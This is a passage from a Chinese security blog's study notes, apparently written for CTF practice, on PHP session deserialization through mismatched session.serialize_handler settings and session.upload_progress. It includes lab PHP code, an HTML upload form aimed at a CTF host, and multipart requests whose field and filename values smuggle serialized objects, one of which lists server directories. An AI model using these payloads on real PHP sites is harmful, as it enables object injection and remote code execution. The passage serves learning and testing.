-<p>等<a href="https://xz.aliyun.com/t/6640?time__1311=n4+xnD0DRDBGitN4q05+bDyiDumxc7l1lZZYD&alichlgref=https://cn.bing.com/#toc-0">参考</a>，下面主要谈谈<code>session.serialize_handler</code>配置项。</p>
-<h4 id="PHP-session的处理器及如何利用"><a href="#PHP-session的处理器及如何利用" class="headerlink" title="PHP session的处理器及如何利用"></a>PHP session的处理器及如何利用</h4><p>上文中提到的PHP session的<strong>序列化机制是由<code>session.serialize_handler</code>来定义引擎的</strong>，引擎也就是php处理器，<em>而序列化后的字符串默认是以文件的方式存储</em>，<em>且存储的文件是由<code>sess_sessionid</code>来决定文件名的</em>，如下：</p>
-<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240425202003456.png" alt="image-20240425202003456"></p>
-<p>当然这个文件名也不是不变的，如<code>Codeigniter</code>框架的 <code>session</code>存储的文件名为<code>ci_sessionSESSIONID</code>等。</p>
-<p>并且文件的内容始终是session值的序列化之后的内容。</p>
-<h5 id="利用函数先说明"><a href="#利用函数先说明" class="headerlink" title="利用函数先说明"></a>利用函数先说明</h5><p>1.PHP提供了<code>session.serialize_handler</code>配置的选项，可以用来定义要使用的处理器，默认是php，如果想要使用其他的就需要<strong>使用ini_set()函数</strong>，格式如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);</span><br><span class="line">//ini_set(&quot;session.serialize_handler&quot;, &quot;php_serialize&quot;);</span><br><span class="line">//ini_set(&quot;session.serialize_handler&quot;, &quot;php_binary&quot;);</span><br></pre></td></tr></table></figure>
-
-<p>2.要想使用session，第一步就是开启session，这也是session的第一阶段这是就需要使用<strong>session_start()函数</strong>。</p>
-<p><strong>这个函数的作用就是开启session</strong>，开启之后读取cookie信息判断是否存在session_id，<u>如果存在就是用这个session_id</u>，如果没有就会随机生成一个唯一的32位的session_id。通过这个session_id就可以绑定一个唯一的用户。</p>
-<p><strong>这个过程还会初始化<code>$SESSION</code>这个变量，但是有两种情况：</strong></p>
-<ul>
-<li><p><strong>若没有这个session文件</strong>，就会读取cookie信息的内容从而序列化数据创建<code>$_SESSION</code>变量并创建一个session文件；</p>
-</li>
-<li><p><strong>若存在session文件</strong>，读取session文件中的内容，把内容反序列化之后赋值到<code>$SESSION</code>这个变量中**，这个阶段还有一个特别关键的作用，还会判断那些session文件已经过期，调用gc进程，删除掉过期的session文件</p>
-</li>
-</ul>
-<p><a href="https://www.cnblogs.com/daijiandong/p/12070947.html">参考1</a>以及<a href="https://blog.csdn.net/cs23405/article/details/81297698">2</a></p>
-<h5 id="php处理器"><a href="#php处理器" class="headerlink" title="php处理器"></a>php处理器</h5><p><strong><code>sessin.serialize_handler</code>定义的引擎有三种</strong>，如下表所示：</p>
-<table>
-<thead>
-<tr>
-<th>处理器名称</th>
-<th>存储格式</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>php</td>
-<td>键名+竖线+经过<code>serialize()</code>函数序列化处理的值</td>
-</tr>
-<tr>
-<td>php_binary</td>
-<td>键名的长度对应的<strong>ASCII字符</strong>（如键长为35则对应<code>#</code>）+键名+经过<code>serialize()</code>函数序列化处理的值</td>
-</tr>
-<tr>
-<td>php_serialize</td>
-<td>经过<code>serialize()</code>函数序列化处理的<strong>数组</strong></td>
-</tr>
-</tbody></table>
-<p><strong>注</strong>：从PHP 5.5.4起可以使用<code>php_serialize</code></p>
-<p><u>上述三种处理器中</u>，*<code>php_serialize</code>在内部简单地直接使用 <code>serialize/unserialize</code>函数*，并且不会有<code>php</code>和 <code>php_binary</code>所具有的限制。 使用较旧的序列化处理器导致<code>$_SESSION</code> 的索引既不能是数字也不能包含特殊字符(<code>|</code> 和 <code>!</code>) 。</p>
-<p>测试一下，demo如下：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h6 id="php"><a href="#php" class="headerlink" title="php"></a>php</h6><p>如图所示：<br><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422192647948.png" alt="image-20240422192647948"></p>
-<p>解析一下：<br>序列化的结果为:<code>session|s:6:&quot;Fupanc&quot;;</code></p>
-<p>其中<code>session</code>为$_SESSION[‘session’]的键名，<code>|</code>为传入GET参数经过序列化后的值。</p>
-<h6 id="php-binary处理器"><a href="#php-binary处理器" class="headerlink" title="php_binary处理器"></a>php_binary处理器</h6><p>将指定处理器函数的参数php改为这个就行，为了方便看，将键名改长一些，（否则对应的ascii字符不可见)，测试结果如下</p>
-<p>demo改为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_binary&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;sessionseesionsessionsessionsession&#x27;] = $_GET[&#x27;session&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>结果如下：</p>
-<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422193133901.png" alt="image-20240422193133901"></p>
-<p>两张图片可以对比一下</p>
-<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422200413609.png" alt="image-20240422200413609"></p>
-<p>序列化的结果为：<code>#sessionsessionsessionsessionsessions:6:&quot;Fupanc&quot;;</code></p>
-<p>解析一下：<br><code>#</code>即为长度为35在ascii对应的符号</p>
-<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422200554081.png" alt="image-20240422200554081"></p>
-<p><code>sessionsessionsessionsessionsessions</code>是键名,</p>
-<p><strong>注意：</strong>这里序列化后的结果会在原代码设置的键名后加一个s，测试了一下，无论大写为多少。</p>
-<p><code>6:&quot;Fupanc&quot;;</code>即为序列化后的字符串。</p>
-<h6 id="php-serialize-处理器"><a href="#php-serialize-处理器" class="headerlink" title="php_serialize 处理器"></a>php_serialize 处理器</h6><p>demo如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;session&#x27;] = $_GET[&#x27;session&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>测试结果：<br><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422201421239.png" alt="image-20240422201421239"></p>
-<p>序列化结果为：<code>a:1:&#123;s:7:&quot;session&quot;;s:6:&quot;Fupanc&quot;;&#125;</code></p>
-<p>解析：<br><code>a:1</code>表示<code>$_SESSION</code>数组中有一个元素，或括号里面的内容即为传入GET参数经过序列化后的值。</p>
-<h5 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h5><h6 id="自建环境测试"><a href="#自建环境测试" class="headerlink" title="自建环境测试"></a>自建环境测试</h6><p>建造一个环境，有两个文件，分别如下：</p>
-<p>flag.php：</p>
-<p>这个页面用于接受session的值</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>1.php：</p>
-<p>这个页面用于测试反序</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handller&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="variable language_">$this</span>-&gt;name=<span class="string">&#x27;haha&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">print_r</span>(<span class="variable">$this</span>-&gt;name);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>先访问1.php，输出</p>
-<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240423203335935.png" alt="image-20240423203335935"></p>
-<p>这里开启了<code>session_start()</code>函数，可以在flag.php页面利用session变量进行反序列化。如下构造payload：</p>
-<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240425202531645.png" alt="image-20240425202531645"></p>
-<p>再在flag.php页面传入这个参，但是需要在前面加上一个<code>|</code>，这是因为php处理器会把|前面的内容当做键，后面的内容才会被反序列化后赋值给session变量</p>
-<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240423203811665.png" alt="image-20240423203811665"></p>
-<p>在电脑上看一看此时session的值：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:1:&#123;s:7:&quot;session&quot;;s:40:&quot;|O:4:&quot;test&quot;:1:&#123;s:4:&quot;name&quot;;s:6:&quot;diyici&quot;;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这里可以看到成功写入，这是再访问以下1.php</p>
-<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240425202506406.png" alt="image-20240425202506406"></p>
-<p>成功反序。</p>
-<p><strong>但是这里的局限性太大，有如下条件：</strong></p>
-<ul>
-<li>两个文件session引擎配置不同</li>
-<li>其中一个session可控</li>
-<li>两个文件同域</li>
-</ul>
-<p>这个只是一个简单的复现过程，真实题目应该不能自己传session进去，现在看看稍真实页面是如何打的。</p>
-<h6 id="利用session-upload-progress进行反序列化-方式一"><a href="#利用session-upload-progress进行反序列化-方式一" class="headerlink" title="利用session.upload_progress进行反序列化-方式一"></a>利用session.upload_progress进行反序列化-方式一</h6><p>结合下述Session上传进度，<strong>这个方法需要php≥5.4</strong></p>
-<p><a href="https://bugs.php.net/bug.php?id=71101">漏洞官方说明</a></p>
-<p>这个漏洞条件官方说的挺清楚的，简单说明一下使用这个方法的条件</p>
-<p>条件：</p>
-<ol>
-<li><code>session.upload_progress.enabled = On</code>（是否启用上传进度报告）</li>
-<li><code>session.upload_progress.cleanup = Off</code>（是否上传完成之后删除session文件-这里需要为Off）</li>
-</ol>
-<p>这两个都是可在查的</p>
-<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240423211803946.png" alt="image-20240423211803946"></p>
-<p><strong>当enabled被设置为on时，此时再往服务器中上传一个文件时，PHP会把该文件的详细信息（如上传时间、上传进度等）存储到session，所以上传文件进度的报告就会以写入到session文件中</strong>，所以我们<u>可以设置一个与<code>session.upload_progress.name</code>同名的变量(默认名为<code>PHP_SESSION_UPLOAD_PROGRESS</code>)，PHP检测到这种同名请求会在<code>$_SESSION</code>中添加一条数据</u>。我们就可以控制这个数据内容为我们的恶意payload</p>
-<p><strong>对session上传进度说明一下：</strong></p>
-<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/1647333728_62305160591d530edf695.jpeg" alt="image-20220315161551104"></p>
-<p>但是需要自己构造一个<strong>文件上传表单</strong>，代码如下：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://web.jarvisoj.com:32784/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>，在上传文件(必须上传)时抓包，直接借用官方的说明，有两种改法（第二种待验证）来进行反序：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-POST_RAW--</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------20896060251896012921717172737</span><br><span class="line">-----------------------------20896060251896012921717172737</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHPSESSID&quot;</span><br><span class="line"></span><br><span class="line">session-data-injection</span><br><span class="line">-----------------------------20896060251896012921717172737</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line"></span><br><span class="line">|xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxO:3:&quot;obj&quot;:0:&#123;&#125;</span><br><span class="line">-----------------------------20896060251896012921717172737</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;file.txt&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">-----------------------------20896060251896012921717172737--</span><br></pre></td></tr></table></figure>
-
-<p>第一个就是上述官方改法，还有一个是在<a href="https://www.freebuf.com/articles/web/324943.html">文章</a>里看到可以改将filename那个file.txt改成payload(文章基本都是这样改的，在值里面改肯能会应该出现|导致数据写入session失败)</p>
-<p><strong>但是文件名需要注意防止引号被转义同时也是为了防止与最外层的双引号冲突</strong>，需要使用\来说明，借用文章代码说明一下（待验证-还是很多文章都在用这种改法）：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----------------------------23899461075638356511525184357</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line"></span><br><span class="line">123</span><br><span class="line">-----------------------------23899461075638356511525184357</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">123</span><br><span class="line">-----------------------------23899461075638356511525184357--</span><br></pre></td></tr></table></figure>
-
-<p><strong>上传成功就可以直接在Index.php页面利用这个payload</strong></p>
-<h6 id="利用session-upload-progress进行反序列化-方式二"><a href="#利用session-upload-progress进行反序列化-方式二" class="headerlink" title="利用session.upload_progress进行反序列化-方式二"></a>利用session.upload_progress进行反序列化-方式二</h6><p><strong>同样需要php≥5.4</strong></p>
-<p>这个方法着重于解决当配置如下使如何解决,一般这个是php.ini的默认项：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. session.upload_progress.enabled = on</span><br><span class="line">2. session.upload_progress.cleanup = on</span><br><span class="line">3. session.upload_progress.prefix = &quot;upload_progress_&quot;</span><br><span class="line">4. session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line">5. session.upload_progress.freq = &quot;1%&quot;</span><br><span class="line">6. session.upload_progress.min_freq = &quot;1&quot;</span><br></pre></td></tr></table></figure>
-
-<p>这里与上面的最主要的区别就是<code>session.upload_progress.cleanup = on</code>，<u>表示当文件上传结束后，php将会立即清空对应session文件中的内容</u>，也就代表我们每次<strong>正常访问</strong>session文件时都是<strong>空文件</strong>。所以想要利用就需要竞争。</p>
-<p><strong>如果cleanup被设置为On，就需要使用条件竞争</strong></p>
-<p>&#x3D;&#x3D;还有一个比较重要的配置：&#x3D;&#x3D;<br><code>session.use_strict_mode=off</code>，这个选项默认值为off，表示我们对cookie中的sessionid可控。这一点很重要。</p>
-<p>开始解析：</p>
-<p>1. </p>
-<ul>
-<li>配置文件中的<code>session.use_strict_mode</code>默认为0时，这个情况下，用户可以定义自己的sessionid，例如当用户在cookie中设置<code>sessionid=Lxxx</code>时，PHP就会生成一个文件<code>/tmp/sess_Lxxx</code>，此时也就初始化了session，并且会将上传的文件信息写入到文件<code>/tmp/sess_Lxxx</code>中去。</li>
-<li>由于<strong>在这种情况下cleanup的值为on</strong>，所以文件上传成功后文件内容会马上被清空，此时就需要利用Python的多线程来条件竞争</li>
-</ul>
-<p>脚本等我后面再补上，有佬有的话求</p>
-<p>参考文章:<code>https://www.freebuf.com/vuls/202819.html</code></p>
-<p>其他例题参考：<br>1.简单过程说明以及其他ctf题解<a href="https://xz.aliyun.com/t/6640?time__1311=n4+xnD0DRDBGitN4q05+bDyiDumxc7l1lZZYD&alichlgref=https://cn.bing.com/#toc-9">文章</a></p>
-]]></content>
-      <categories>
-        <category>php相关漏洞</category>
-        <category>php反序列化</category>
-        <category>session反序列化</category>
       </categories>
   </entry>
   <entry>
